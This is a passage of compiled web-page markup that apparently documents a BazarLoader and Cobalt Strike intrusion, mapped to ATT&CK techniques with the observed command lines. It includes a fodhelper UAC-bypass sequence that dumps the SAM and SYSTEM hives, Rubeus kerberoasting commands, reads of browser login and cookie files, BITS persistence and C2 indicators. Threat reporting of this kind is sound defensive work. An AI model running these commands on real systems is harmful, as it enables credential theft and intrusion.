",(0,l.kt)("em",{parentName:"h3"},".LNK")," files in ",(0,l.kt)("em",{parentName:"h3"},".ISO")," files to lure users for Execution."),(0,l.kt)("h4",{id:"tactic-2"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Execution")),(0,l.kt)("h4",{id:"techniques-2"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1204.002 - User Execution: Malicious File"),(0,l.kt)("li",{parentName:"ul"},"T1553.005 - Subvert Trust Controls: Mark-of-the-Web Bypass")),(0,l.kt)("h4",{id:"behaviors-and-observables-2"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1204.002",(0,l.kt)("br",null),"T1553.005"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Explorer.exe")," spawned ",(0,l.kt)("em",{parentName:"td"},"RunDll32"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\rundll32.exe SharedFiles.dll, BasicScore"))))),(0,l.kt)("h4",{id:"notes-1"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"SharedFiles.dll is included in the ISO file")),(0,l.kt)("h3",{id:"threat-actor-used-rundll32-to-execute-dll-payloads-for-defense-evasion"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"RUNDLL32")," to execute ",(0,l.kt)("em",{parentName:"h3"},".DLL")," payloads for Defense Evasion."),(0,l.kt)("h4",{id:"tactic-3"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Defense Evasion")),(0,l.kt)("h4",{id:"techniques-3"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1218.011 - Signed Binary Proxy Execution: Rundll32")),(0,l.kt)("h4",{id:"behaviors-and-observables-3"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," executed _.DLL."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\rundll32.exe SharedFiles.dll, BasicScore"))))),(0,l.kt)("h3",{id:"bazarloader-used-bitsadmin-command-line-callbacks-for-persistence"},"BazarLoader used ",(0,l.kt)("em",{parentName:"h3"},"BITSadmin")," command-line callbacks for Persistence."),(0,l.kt)("h4",{id:"tactic-4"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Persistence")),(0,l.kt)("h4",{id:"techniques-4"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1197 - BITS Jobs"),(0,l.kt)("li",{parentName:"ul"},"T1218.011 - Signed Binary Proxy Execution: Rundll32")),(0,l.kt)("h4",{id:"behaviors-and-observables-4"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null}),(0,l.kt)("td",{parentName:"tr",align:null},"BITS job executed via ",(0,l.kt)("em",{parentName:"td"},"SVCHOST"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\svchost.exe -k netsvcs -p -s BITS"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1197",(0,l.kt)("br",null),"T1218.011"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"svchost.exe")," spawned ",(0,l.kt)("em",{parentName:"td"},"RunDll32"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'rundll32.exe \\"D:\\\\SharedFiles.dll\\", BasicScore'))))),(0,l.kt)("h4",{id:"notes-2"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"the BITS job is designed to fail; attempts to download an unexisting file."),(0,l.kt)("li",{parentName:"ul"},'the "bitsadmin /setnotifycmdline" option is used to specify a callback commandline'),(0,l.kt)("li",{parentName:"ul"},'Name of the BITS job is "Microsoft Office Manager upgrade v24.24"')),(0,l.kt)("h3",{id:"bazarloader-used-a-well-known-set-of-netexe-and-nltestexe-commands-for-discovery"},"BazarLoader used a well known set of ",(0,l.kt)("em",{parentName:"h3"},"net.exe")," and ",(0,l.kt)("em",{parentName:"h3"},"nltest.exe")," commands for Discovery."),(0,l.kt)("h4",{id:"tactic-5"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Discovery")),(0,l.kt)("h4",{id:"techniques-5"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1069.001 - Permission Groups Discovery: Local Groups"),(0,l.kt)("li",{parentName:"ul"},"T1069.002 - Permission Groups Discovery: Domain Groups"),(0,l.kt)("li",{parentName:"ul"},"T1482 - Domain Trust Discovery"),(0,l.kt)("li",{parentName:"ul"},"T1018 - Remote System Discovery"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,l.kt)("h4",{id:"behaviors-and-observables-5"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1069.001",(0,l.kt)("br",null),"T1069.002",(0,l.kt)("br",null),"T1482",(0,l.kt)("br",null),"T1018",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Sequence of ",(0,l.kt)("em",{parentName:"td"},"net.exe")," and ",(0,l.kt)("em",{parentName:"td"},"nltest.exe")," commands."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net group /domain admins"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net group \\"Domain Computers\\" /domain'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net localgroup administrator"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net view /all"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"nltest /domain_trusts /alltrusts"))))),(0,l.kt)("h3",{id:"bazarloader-used-http-protocol-to-download-cobalt-strike-beacon-dll-files-for-command-and-control"},"BazarLoader used HTTP protocol to download ",(0,l.kt)("em",{parentName:"h3"},"Cobalt Strike")," Beacon DLL files for Command And Control."),(0,l.kt)("h4",{id:"tactic-6"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Command And Control")),(0,l.kt)("h4",{id:"techniques-6"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1071.001 - Application Layer Protocol: Web Protocols"),(0,l.kt)("li",{parentName:"ul"},"T1218.011 - Signed Binary Proxy Execution: Rundll32"),(0,l.kt)("li",{parentName:"ul"},"T1105 - Ingress Tool Transfer")),(0,l.kt)("h4",{id:"behaviors-and-observables-6"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001",(0,l.kt)("br",null),"T1218.011"),(0,l.kt)("td",{parentName:"tr",align:null},"RunDll32 performed network connection to public IPs"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"23.81.246[.]32"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"gawocag[.]com"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1105",(0,l.kt)("br",null),"T1218.011"),(0,l.kt)("td",{parentName:"tr",align:null},"RunDll32 dropped  malicious ",(0,l.kt)("em",{parentName:"td"},".dll")," files."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\tfpkuengdlu.dll"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\temp.dll"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\uvvfvnnswte.dll"))))),(0,l.kt)("h3",{id:"threat-actor-used-process-injection-into-edge-browser-to-launch-cobalt-strike-post-exploitation-tasks-for-defense-evasion"},"Threat Actor used process injection into ",(0,l.kt)("em",{parentName:"h3"},"Edge browser")," to launch ",(0,l.kt)("em",{parentName:"h3"},"Cobalt Strike")," post-exploitation tasks for Defense Evasion."),(0,l.kt)("h4",{id:"tactic-7"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Defense Evasion")),(0,l.kt)("h4",{id:"techniques-7"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1055 - Process Injection"),(0,l.kt)("li",{parentName:"ul"},"T1018 - Remote System Discovery"),(0,l.kt)("li",{parentName:"ul"},"T1218.011 - Signed Binary Proxy Execution: Rundll32")),(0,l.kt)("h4",{id:"behaviors-and-observables-7"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1055",(0,l.kt)("br",null),"T1018"),(0,l.kt)("td",{parentName:"tr",align:null},"Injected ",(0,l.kt)("em",{parentName:"td"},"Edge browser")," spawned ",(0,l.kt)("em",{parentName:"td"},"net.exe")," command."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net view /all"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011",(0,l.kt)("br",null),"T1055"),(0,l.kt)("td",{parentName:"tr",align:null},"Injected ",(0,l.kt)("em",{parentName:"td"},"Edge browser")," spawned malicious ",(0,l.kt)("em",{parentName:"td"},"RunDll32.exe")," executions."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'rundll32.exe \\"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Bfzefze\\\\tfpkuengdlu\\" EnterDll'))))),(0,l.kt)("h3",{id:"threat-actor-used-cobalt-strike-to-execute-ipconfig-and-net-user-commands-for-discovery"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"Cobalt Strike")," to execute ",(0,l.kt)("em",{parentName:"h3"},"ipconfig")," and ",(0,l.kt)("em",{parentName:"h3"},"net user")," commands for Discovery."),(0,l.kt)("h4",{id:"tactic-8"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Discovery")),(0,l.kt)("h4",{id:"techniques-8"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1018 - Remote System Discovery"),(0,l.kt)("li",{parentName:"ul"},"T1218.011 - Signed Binary Proxy Execution: Rundll32")),(0,l.kt)("h4",{id:"behaviors-and-observables-8"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1018",(0,l.kt)("br",null),"T1218.011"),(0,l.kt)("td",{parentName:"tr",align:null},"Injected ",(0,l.kt)("em",{parentName:"td"},"RunDll32")," spawned ",(0,l.kt)("em",{parentName:"td"},"ipconfig.exe"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"ipconfig /all"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011"),(0,l.kt)("td",{parentName:"tr",align:null},"Injected ",(0,l.kt)("em",{parentName:"td"},"RunDll32")," spawned ",(0,l.kt)("em",{parentName:"td"},"net.exe"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net user USER /domain"))))),(0,l.kt)("h3",{id:"threat-actor-used-cobalt-strike-to-execute-a-well-known-adfind-recon-script-for-discovery"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"Cobalt Strike")," to execute a well-known ",(0,l.kt)("em",{parentName:"h3"},"AdFind")," recon script for Discovery."),(0,l.kt)("h4",{id:"tactic-9"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Discovery")),(0,l.kt)("h4",{id:"techniques-9"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1218.011 - Signed Binary Proxy Execution: Rundll32"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("li",{parentName:"ul"},"T1016 - System Network Configuration Discovery"),(0,l.kt)("li",{parentName:"ul"},"T1482 - Domain Trust Discovery"),(0,l.kt)("li",{parentName:"ul"},"T1036 - Masquerading")),(0,l.kt)("h4",{id:"behaviors-and-observables-9"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Injected ",(0,l.kt)("em",{parentName:"td"},"RunDll32")," launched ",(0,l.kt)("em",{parentName:"td"},"CMD")," to execute ",(0,l.kt)("em",{parentName:"td"},"AdFind")," recon script."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd.exe /C adf.bat"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1016",(0,l.kt)("br",null),"T1482",(0,l.kt)("br",null),"T1036"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," launched sequence of masqueraded ",(0,l.kt)("em",{parentName:"td"},"AdFind.exe")," commands."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'qq.exe -f \\"(objectcategory=person)\\"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'qq.exe -f \\"objectcategory=computer\\"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'qq.exe -f \\"(objectcategory=organizationalUnit)\\"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"qq.exe -sc trustdmp"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"qq.exe -subnets -f (objectCategory=subnet)"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'qq.exe -f \\"(objectcategory=group)\\"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"qq.exe -gcb -sc trustdmp"))))),(0,l.kt)("h4",{id:"notes-3"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Well known recon script adf.bat"),(0,l.kt)("li",{parentName:"ul"},"AdFind renamed to qq")),(0,l.kt)("h3",{id:"threat-actor-used-a-cmd-batch-script-to-dump-sam-security-and-system-registry-hives-via-regexe-for-credential-access"},"Threat Actor used a ",(0,l.kt)("em",{parentName:"h3"},"CMD")," batch script to dump SAM, SECURITY and SYSTEM registry hives via Reg.exe for Credential Access."),(0,l.kt)("h4",{id:"tactic-10"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Credential Access")),(0,l.kt)("h4",{id:"techniques-10"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1003.002 - Security Account Manager"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,l.kt)("h4",{id:"behaviors-and-observables-10"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1003.002",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Dumped SAM, SECURITY and SYSTEM registry hives using a batch script named 'fodhelper_reg_hashes.bat'."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /ve /d \\"reg.exe save hklm\\\\sam c:\\\\ProgramData\\\\sam.save\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /v \\"DelegateExecute\\" /f fodhelper.exe'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /ve /d \\"reg.exe save hklm\\\\security c:\\\\ProgramData\\\\security.save\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /v \\"DelegateExecute\\" /f fodhelper.exe'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /ve /d \\"reg.exe save hklm\\\\system c:\\\\ProgramData\\\\system.save\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /v \\"DelegateExecute\\" /f fodhelper.exe'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"reg.exe delete hkcu\\\\software\\\\classes\\\\ms-settings /f >nul 2>&1"))))),(0,l.kt)("h4",{id:"notes-4"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"(using a batch script named fodhelper_reg_hashes.bat)")),(0,l.kt)("h3",{id:"threat-actor-used-morecom-command-line-tool-to-access-web-browser-internal-files-for-credential-access"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"MORE.COM")," command-line tool to access Web Browser internal files for Credential Access."),(0,l.kt)("h4",{id:"tactic-11"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Credential Access")),(0,l.kt)("h4",{id:"techniques-11"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1555.003 - Credentials from Web Browsers"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,l.kt)("h4",{id:"behaviors-and-observables-11"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1555.003",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," spawned ",(0,l.kt)("em",{parentName:"td"},"MORE.COM")," commands to read Web Browser internal files"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"more C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Login Data"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"more C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Cookies"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"more C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\edge-cookies.json"))))),(0,l.kt)("h4",{id:"notes-5"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"More.com, a.k.k. More Utility file, is part of Microsoft Windows."),(0,l.kt)("li",{parentName:"ul"},"More.com allows to read text files.")),(0,l.kt)("h3",{id:"threat-actor-used-rubeusexe-for-credential-access"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"Rubeus.exe")," for Credential Access."),(0,l.kt)("h4",{id:"tactic-12"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Credential Access")),(0,l.kt)("h4",{id:"techniques-12"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting"),(0,l.kt)("li",{parentName:"ul"},"T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,l.kt)("h4",{id:"behaviors-and-observables-12"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1558.003",(0,l.kt)("br",null),"T1558.004",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," spawned ",(0,l.kt)("em",{parentName:"td"},"Rubeus")," to output results at ProgramData folder."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\cmd.exe /C Rubeus.exe kerberoast /ldapfilter:\\'admincount=1\\' /format:hashcat /outfile:C:\\\\ProgramData\\\\hashes.txt"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\cmd.exe /C Rubeus.exe asreproast /format:hashcat /outfile:C:\\\\ProgramData\\\\asrephashes.txt"))))),(0,l.kt)("h4",{id:"notes-6"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Rubeus is a C# toolset for raw Kerberos interaction and abuse.")),(0,l.kt)("h3",{id:"threat-actor-used-multiple-system-utilities-for-discovery"},"Threat Actor used multiple system utilities for Discovery."),(0,l.kt)("h4",{id:"tactic-13"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Discovery")),(0,l.kt)("h4",{id:"techniques-13"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1016 - System Network Configuration Discovery")),(0,l.kt)("h4",{id:"behaviors-and-observables-13"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1016"),(0,l.kt)("td",{parentName:"tr",align:null},"Performed additional Discovery activity"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net group "Domain Admins" /domain'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"whoami"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"ipconfig /all"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"systeminfo"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"tasklist"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net group \\"Enterprise admins\\" /domain'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net localgroup administrators"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"whoami /all"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net use"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"query user"))))),(0,l.kt)("h4",{id:"notes-7"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"multiple commands")),(0,l.kt)("h3",{id:"threat-actor-used-powershell-and-cmd-to-install-anydesk-for-persistence"},"Threat Actor used 